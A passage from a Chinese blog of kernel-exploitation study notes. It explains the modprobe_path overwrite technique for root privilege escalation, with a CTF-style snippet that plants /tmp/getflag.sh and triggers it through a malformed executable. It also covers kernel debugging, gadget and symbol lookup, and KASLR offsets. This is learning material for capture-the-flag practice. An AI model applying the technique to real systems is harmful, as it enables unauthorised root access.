proto-&gt;name,</span><br><span class="line">    conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum,</span><br><span class="line">    timer_pending(&amp;conntrack-&gt;timeout)</span><br><span class="line">    ? (<span class="type">long</span>)(conntrack-&gt;timeout.expires - jiffies)/HZ</span><br><span class="line">    : <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line"> 	<span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;use=%u\n&quot;</span>, <span class="type">atomic_read</span>(&amp;conntrack-&gt;ct_general.use)))</span><br><span class="line"> 	<span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>seq流函数的使用保证了数据能顺序输出，这也就是&#x2F;proc只读文件中使用它的最大原因吧。</p>
<h2 id="阅读情况：粗略了解"><a href="#阅读情况：粗略了解" class="headerlink" title="@###阅读情况：粗略了解"></a>@###阅读情况：粗略了解</h2><h1 id="modprobe-path覆写"><a href="#modprobe-path覆写" class="headerlink" title="modprobe_path覆写"></a>modprobe_path覆写</h1><h2 id="modprobe-path介绍"><a href="#modprobe-path介绍" class="headerlink" title="modprobe_path介绍"></a>modprobe_path介绍</h2><p><code>modprobe_path</code>是用于在<code>Linux</code>内核中添加可加载的内核模块，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为 <code>/sbin/modprobe</code>，可以通过如下命令来查看该值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br><span class="line">-&gt; /sbin/modprobe</span><br></pre></td></tr></table></figure>

<p>此外，<code>modprobe_path</code>存储在内核本身的<code>modprobe_path</code>符号中，且具有可写权限。也即普通权限即可修改该值。</p>
<p>而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 <code>modprobe_path</code>所指向的程序。如果我们将这个字符串指向我们自己的<code>sh</code>文件 ，并使用 <code>system</code>或 <code>execve</code> 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）do_execve()</span><br><span class="line">（<span class="number">2</span>）do_execveat_common()</span><br><span class="line">（<span class="number">3</span>）bprm_execve()</span><br><span class="line">（<span class="number">4</span>）exec_binprm()</span><br><span class="line">（<span class="number">5</span>）search_binary_handler()</span><br><span class="line">（<span class="number">6</span>）request_module()</span><br><span class="line">（<span class="number">7</span>）call_usermodehelper()</span><br></pre></td></tr></table></figure>

<p>那么查看 <code>__request_module</code> 源码如下，本质就是调用了 <code>call_usermodehelper</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __request_module(<span class="type">bool</span> wait, <span class="type">const</span> <span class="type">char</span> *fmt, ...) </span><br><span class="line">&#123; </span><br><span class="line">    va_list args; </span><br><span class="line">    <span class="type">char</span> module_name[MODULE_NAME_LEN]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_modprobes; </span><br><span class="line">    <span class="type">int</span> ret; </span><br><span class="line"><span class="comment">// char modprobe_path[KMOD_PATH_LEN] = &quot;/sbin/modprobe&quot;; </span></span><br><span class="line">    <span class="type">char</span> *argv[] = &#123; modprobe_path, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--&quot;</span>, module_name, <span class="literal">NULL</span> &#125;; </span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *envp[] = &#123; <span class="string">&quot;HOME=/&quot;</span>, </span><br><span class="line">                <span class="string">&quot;TERM=linux&quot;</span>, </span><br><span class="line">                <span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>, </span><br><span class="line">                <span class="literal">NULL</span> &#125;; <span class="comment">// 环境变量. </span></span><br><span class="line">    <span class="type">static</span> <span class="type">atomic_t</span> kmod_concurrent = ATOMIC_INIT(<span class="number">0</span>); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_KMOD_CONCURRENT 50    <span class="comment">/* Completely arbitrary value - KAO */</span> </span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> kmod_loop_msg; </span><br><span class="line"></span><br><span class="line">    va_start(args, fmt); </span><br><span class="line">    ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   </span><br><span class="line">    va_end(args); </span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= MODULE_NAME_LEN) </span><br><span class="line">        <span class="keyword">return</span> -ENAMETOOLONG; </span><br><span class="line">    max_modprobes = min(max_threads/<span class="number">2</span>, MAX_KMOD_CONCURRENT);    </span><br><span class="line">    <span class="type">atomic_inc</span>(&amp;kmod_concurrent); </span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;kmod_concurrent) &gt; max_modprobes) &#123; </span><br><span class="line">        <span class="comment">/* We may be blaming an innocent here, but unlikely */</span> </span><br><span class="line">        <span class="keyword">if</span> (kmod_loop_msg++ &lt; <span class="number">5</span>) </span><br><span class="line">            printk(KERN_ERR </span><br><span class="line">                   <span class="string">&quot;request_module: runaway loop modprobe %s\n&quot;</span>, </span><br><span class="line">                   module_name); </span><br><span class="line">        <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                           </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;                                         </span><br><span class="line">    &#125; </span><br><span class="line">    ret = call_usermodehelper(modprobe_path, argv, envp,        <span class="comment">// 执行用户空间的应用程序</span></span><br><span class="line">            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); </span><br><span class="line">    <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                                </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着查看 <code>call_usermodehelper</code>函数源码，该函数用于在内核空间中执行用户空间的程序，并且该程序具有<code>root</code>权限。这也保证了我们自己所写的 <code>sh</code>文件在被执行时，能执行具有<code>root</code>权限的功能，实现提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call_usermodehelper(<span class="type">char</span> *path, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="keyword">enum</span> umh_wait wait);</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">umh_wait</span> &#123;</span></span><br><span class="line">    UMH_NO_WAIT = <span class="number">-1</span>,       <span class="comment">/* don&#x27;t wait at all */</span></span><br><span class="line">    UMH_WAIT_EXEC = <span class="number">0</span>,      <span class="comment">/* wait for the exec, but not the process */</span></span><br><span class="line">    UMH_WAIT_PROC = <span class="number">1</span>,      <span class="comment">/* wait for the process to complete */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<p>代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fl&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/fl&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//changed modprobe_path</span></span><br><span class="line">system(<span class="string">&quot;/tmp/fl&quot;</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li>首先创建了一个我们自己的 sh文件 geflag.sh，用于 将 &#x2F;flag拷贝到 &#x2F;tmp&#x2F;flag下，并赋予 &#x2F;tmp&#x2F;flag为可读可写可执行权限。然后赋予 &#x2F;tmp&#x2F;getflag.sh可执行权限。</li>
<li>随后创建了一个错误格式头的文件 &#x2F;tmp&#x2F;fl，并赋予其可执行权限</li>
<li>当我们覆写了 modprobe_path为 &#x2F;tmp&#x2F;getflag.sh后，调用 system(“&#x2F;tmp&#x2F;fl”)触发错误，随后就能以root权限执行 &#x2F;tmp&#x2F;getflag.sh，完成将原本只能 root可读的flag拷贝到 &#x2F;tmp目录下，并赋予可读权限</li>
</ol>
<p>此外，我们该如何确定 <code>modprobe_path</code>符号的存储地址呢？在内核题目中，通常使用 <code>cat /proc/kallsyms</code>来获取符号地址，但是 <code>modprobe_path</code>并不在其中。这里我们可以考虑查找引用了<code>modprobe_path</code>符号的地址，来获取其地址。而在上面 <code>__request_module</code>代码中，即引用了 <code>modprobe_path</code>的地址。所以我们可以通过以下方法找到 <code>modprobe_path</code>地址：</p>
<ul>
<li>先通过 &#x2F;proc&#x2F;kallsyms找到 __request_module地址</li>
<li>随后查看 __reques_module函数汇编，找到 modprobe_path的引用</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/</span> <span class="comment"># cat /proc/kallsyms | grep __request     </span></span><br><span class="line"><span class="string">ffffffffbb2aad00</span> <span class="string">T</span> <span class="string">__request_module</span>         </span><br><span class="line"><span class="string">ffffffffbb1afdb8</span> <span class="string">t</span> <span class="string">__request_module.cold</span>    </span><br><span class="line"><span class="string">ffffffffba886e60</span> <span class="string">T</span> <span class="string">__request_percpu_irq</span>     </span><br><span class="line"><span class="string">ffffffffbb2baa30</span> <span class="string">T</span> <span class="string">__request_region</span>         </span><br><span class="line"><span class="string">ffffffffbaee47fc</span> <span class="string">t</span> <span class="string">__request_region.cold</span>    </span><br><span class="line"><span class="string">ffffffffba8aa2b0</span> <span class="string">t</span> <span class="string">__request_resource</span>       </span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/28i</span> <span class="number">0xffffffffbb2aad00</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad00:</span>  <span class="string">push</span>   <span class="string">rbp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad01:</span>  <span class="string">mov</span>    <span class="string">rbp,rsp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad04:</span>  <span class="string">push</span>   <span class="string">r14</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad06:</span>  <span class="string">push</span>   <span class="string">r13</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad08:</span>  <span class="string">push</span>   <span class="string">r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0a:</span>  <span class="string">mov</span>    <span class="string">r12,rsi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0d:</span>  <span class="string">push</span>   <span class="string">r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0f:</span>  <span class="string">lea</span>    <span class="string">r10,[rbp+0x10]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad13:</span>  <span class="string">push</span>   <span class="string">rbx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad14:</span>  <span class="string">mov</span>    <span class="string">r13,r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad17:</span>  <span class="string">mov</span>    <span class="string">ebx,edi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad19:</span>  <span class="string">sub</span>    <span class="string">rsp,0xb0</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad20:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x48</span>]<span class="string">,rdx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad24:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x40</span>]<span class="string">,rcx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad28:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x38</span>]<span class="string">,r8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad2c:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x30</span>]<span class="string">,r9</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad30:</span>  <span class="string">mov</span>    <span class="string">rax,QWORD</span> <span class="string">PTR</span> <span class="string">gs:0x28</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad39:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x60</span>]<span class="string">,rax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3d:</span>  <span class="string">xor</span>    <span class="string">eax,eax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3f:</span>  <span class="string">test</span>   <span class="string">dil,dil</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad42:</span>  <span class="string">jne</span>    <span class="number">0xffffffffbb2aaec8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad48:</span>  <span class="string">cmp</span>    <span class="string">BYTE</span> <span class="string">PTR</span> [<span class="string">rip+0x59d711</span>]<span class="string">,0x0</span>        <span class="comment"># 0xffffffffbb848460</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad4f:</span>  <span class="string">je</span>     <span class="number">0xffffffffbb2ab024</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad55:</span>  <span class="string">lea</span>    <span class="string">rax,[rbp-0x58]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad59:</span>  <span class="string">lea</span>    <span class="string">rcx,[rbp-0xb0]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad60:</span>  <span class="string">mov</span>    <span class="string">rdx,r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad63:</span>  <span class="string">mov</span>    <span class="string">esi,0x38</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad68:</span>  <span class="string">lea</span>    <span class="string">rdi,[rbp-0x98]</span></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/s</span> <span class="number">0xffffffffbb848460</span></span><br><span class="line"><span class="attr">0xffffffffbb848460:</span>     <span class="string">&quot;/sbin/modprobe&quot;</span></span><br></pre></td></tr></table></figure>

<p>那么，总结一下该 技术的使用条件：</p>
<ul>
<li>知道 modprobe_path地址</li>
<li>拥有一个任意地址写漏洞，用于修改 modprobe_path内容</li>
</ul>
<h2 id="阅读情况：大致了解"><a href="#阅读情况：大致了解" class="headerlink" title="@###阅读情况：大致了解"></a>@###阅读情况：大致了解</h2><h1 id="内核调试命令"><a href="#内核调试命令" class="headerlink" title="内核调试命令"></a>内核调试命令</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo  <span class="comment"># 查看所开保护</span></span><br><span class="line"><span class="built_in">cat</span> /proc/slabinfo  <span class="comment"># 查看内核堆块</span></span><br></pre></td></tr></table></figure>

<h2 id="获取-ROP-地址"><a href="#获取-ROP-地址" class="headerlink" title="获取 ROP 地址"></a>获取 ROP 地址</h2><p>这块有时 ROPgadget 快，有时 ropper 快，随缘吧</p>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>使用方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; _gadget.txt</span><br></pre></td></tr></table></figure>

<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>使用方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --no-color -f ./vmlinux &gt; gadget.txt</span><br></pre></td></tr></table></figure>

<h2 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsmod  <span class="comment"># 查看装载驱动，也是获得内核文件加载的基地址</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure>

<p>此处若是开了地址随机化，需要先改启动脚本，使 kaslr 变成 nokaslr，然后获取一个栈地址，将其记录</p>
<p>之后再把 nokaslr 改回 kaslr，运行脚本获得之前所记录地址处对应的新地址，做差，记录这个差值为 stackbase</p>
<p>之后把获得的所有的内核地址都加上这个 stackbase，即差值，才能获得在开启 kaslr 下的真实地址</p>
<h1 id="gdb-multiarch-调试命令"><a href="#gdb-multiarch-调试命令" class="headerlink" title="gdb-multiarch 调试命令"></a>gdb-multiarch 调试命令</h1><p>一般来说用 gdb 就可以，跨平台的话就要用 gdb-multiarch</p>
<h2 id="设置架构"><a href="#设置架构" class="headerlink" title="设置架构"></a>设置架构</h2><p>在 startvm.sh 脚本上设置好端口后就可以用 gdb-multiarch 来调试了</p>
<p>首先要根据使用的 qemu 来设置系统架构，设置命令为<code>set architecture 内核系统架构</code></p>
<p>架构有很多，我用的是 qemu 3.0.0，是在 Ubuntu 16.04 下自行编译安装的，因为默认版本很老</p>
<p>不过 Ubuntu 18.04 之后的 qemu 都是 3.0.0 以后的版本，所以按需搭配自己喜欢的环境就好</p>
<p>架构一览：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">aarch64                        mips:4400</span><br><span class="line">aarch64:ilp32                  mips:4600</span><br><span class="line">alpha                          mips:4650</span><br><span class="line">alpha:ev4                      mips:5000</span><br><span class="line">alpha:ev5                      mips:5400</span><br><span class="line">alpha:ev6                      mips:5500</span><br><span class="line">arm                            mips:5900</span><br><span class="line">armv2                          mips:6000</span><br><span class="line">armv2a                         mips:7000</span><br><span class="line">armv3                          mips:8000</span><br><span class="line">armv3m                         mips:9000</span><br><span class="line">armv4                          mips:isa32</span><br><span class="line">armv4t                         mips:isa32r2</span><br><span class="line">armv5                          mips:isa32r3</span><br><span class="line">armv5t                         mips:isa32r5</span><br><span class="line">armv5te                        mips:isa32r6</span><br><span class="line">auto                           mips:isa64</span><br><span class="line">ep9312                         mips:isa64r2</span><br><span class="line">hppa1.0                        mips:isa64r3</span><br><span class="line">i386                           mips:isa64r5</span><br><span class="line">i386:intel                     mips:isa64r6</span><br><span class="line">i386:nacl                      mips:loongson_2e</span><br><span class="line">i386:x64-32                    mips:loongson_2f</span><br><span class="line">i386:x64-32:intel              mips:loongson_3a</span><br><span class="line">i386:x64-32:nacl               mips:micromips</span><br><span class="line">i386:x86-64                    mips:mips5</span><br><span class="line">i386:x86-64:intel              mips:octeon</span><br><span class="line">i386:x86-64:nacl               mips:octeon+</span><br><span class="line">i8086                          mips:octeon2</span><br><span class="line">ia64-elf32                     mips:octeon3</span><br><span class="line">ia64-elf64                     mips:sb1</span><br><span class="line">iwmmxt                         mips:xlr</span><br><span class="line">iwmmxt2                        powerpc:403</span><br><span class="line">m32r                           powerpc:601</span><br><span class="line">m32r2                          powerpc:603</span><br><span class="line">m32rx                          powerpc:604</span><br><span class="line">m68k                           powerpc:620</span><br><span class="line">m68k:5200                      powerpc:630</span><br><span class="line">m68k:5206e                     powerpc:7400</span><br><span class="line">m68k:521x                      powerpc:750</span><br><span class="line">m68k:5249                      powerpc:EC603e</span><br><span class="line">m68k:528x                      powerpc:MPC8XX</span><br><span class="line">m68k:5307                      powerpc:a35</span><br><span class="line">m68k:5407                      powerpc:common</span><br><span class="line">m68k:547x                      powerpc:common64</span><br><span class="line">m68k:548x                      powerpc:e500</span><br><span class="line">m68k:68000                     powerpc:e500mc</span><br><span class="line">m68k:68008                     powerpc:e500mc64</span><br><span class="line">m68k:68010                     powerpc:e5500</span><br><span class="line">m68k:68020                     powerpc:e6500</span><br><span class="line">m68k:68030                     powerpc:rs64ii</span><br><span class="line">m68k:68040                     powerpc:rs64iii</span><br><span class="line">m68k:68060                     powerpc:titan</span><br><span class="line">m68k:cfv4e                     powerpc:vle</span><br><span class="line">m68k:cpu32                     rs6000:6000</span><br><span class="line">m68k:fido                      rs6000:rs1</span><br><span class="line">m68k:isa-a                     rs6000:rs2</span><br><span class="line">m68k:isa-a:emac                rs6000:rsc</span><br><span class="line">m68k:isa-a:mac                 s390:31-bit</span><br><span class="line">m68k:isa-a:nodiv               s390:64-bit</span><br><span class="line">m68k:isa-aplus                 sh</span><br><span class="line">m68k:isa-aplus:emac            sh-dsp</span><br><span class="line">m68k:isa-aplus:mac             sh2</span><br><span class="line">m68k:isa-b                     sh2a</span><br><span class="line">m68k:isa-b:emac                sh2a-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>               sh2a-nofpu-or-sh3-nommu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:emac          sh2a-nofpu-or-sh4-nommu-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:mac           sh2a-or-sh3e</span><br><span class="line">m68k:isa-b:mac                 sh2a-or-sh4</span><br><span class="line">m68k:isa-b:nousp               sh2e</span><br><span class="line">m68k:isa-b:nousp:emac          sh3</span><br><span class="line">m68k:isa-b:nousp:mac           sh3-dsp</span><br><span class="line">m68k:isa-c                     sh3-nommu</span><br><span class="line">m68k:isa-c:emac                sh3e</span><br><span class="line">m68k:isa-c:mac                 sh4</span><br><span class="line">m68k:isa-c:nodiv               sh4-nofpu</span><br><span class="line">m68k:isa-c:nodiv:emac          sh4-nommu-nofpu</span><br><span class="line">m68k:isa-c:nodiv:mac           sh4a</span><br><span class="line">mips                           sh4a-nofpu</span><br><span class="line">mips:10000                     sh4al-dsp</span><br><span class="line">mips:12000                     sh5</span><br><span class="line">mips:14000                     sparc</span><br><span class="line">mips:16                        sparc:sparclet</span><br><span class="line">mips:16000                     sparc:sparclite</span><br><span class="line">mips:3000                      sparc:sparclite_le</span><br><span class="line">mips:3900                      sparc:v8plus</span><br><span class="line">mips:4000                      sparc:v8plusa</span><br><span class="line">mips:4010                      sparc:v8plusb</span><br><span class="line">mips:4100                      sparc:v9</span><br><span class="line">mips:4111                      sparc:v9a</span><br><span class="line">mips:4120                      sparc:v9b</span><br><span class="line">mips:4300                      xscale</span><br></pre></td></tr></table></figure>

<p>假使 startvm.sh 上面所写的 qemu 种类是 qemu-system-x86_64</p>
<p>那么就用 i386:x86-64 架构，输入命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br></pre></td></tr></table></figure>

<h2 id="连接端口"><a href="#连接端口" class="headerlink" title="连接端口"></a>连接端口</h2><p>命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<h2 id="读取内核文件符号表及内核加载基地址"><a href="#读取内核文件符号表及内核加载基地址" class="headerlink" title="读取内核文件符号表及内核加载基地址"></a>读取内核文件符号表及内核加载基地址</h2><p>先用 extract-vmlinux 命令提取 vmlinux 文件，命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<p>然后先用 root 用户登录，在里面输入 lsmod 获得模块加载的基地址：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># $ lsmod</span></span><br><span class="line">baby 16384 1 - Live 0xffffffffc0000000 (POE)</span><br></pre></td></tr></table></figure>

<p>之后启动的时候这么启动：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./vmlinux -ex <span class="string">&quot;set architecture i386:x86-64&quot;</span> -ex <span class="string">&quot;add-symbol-file ./baby.ko 0xffffffffc0000000&quot;</span> -ex <span class="string">&quot;target remote localhost:2222&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="eth0-1"><a href="#eth0-1" class="headerlink" title="eth0&#x2F;1"></a>eth0&#x2F;1</h1><p>eth0 eth0:1 和eth0.1三者的关系对应于物理网卡、子网卡、虚拟VLAN网卡的关系：<br><strong>物理网卡：物理网卡这里指的是服务器上实际的网络接口设备，这里我服务器上双网卡，在系统中看到的2个物理网卡分别对应是eth0和eth1这两个网络接口。</strong></p>
<p><strong>子网卡</strong>：子网卡在这里并不是实际上的网络接口设备，但是可以作为网络接口在系统中出现，如eth0:1、eth1:2这种网络接口。它们必须要依赖于物理网卡，虽然可以与物理网卡的网络接口同时在系统中存在并使用不同的IP地址，而且也拥有它们自己的网络接口配置文件。但是当所依赖的物理网卡不启用时（Down状态）这些子网卡也将一同不能工作。</p>
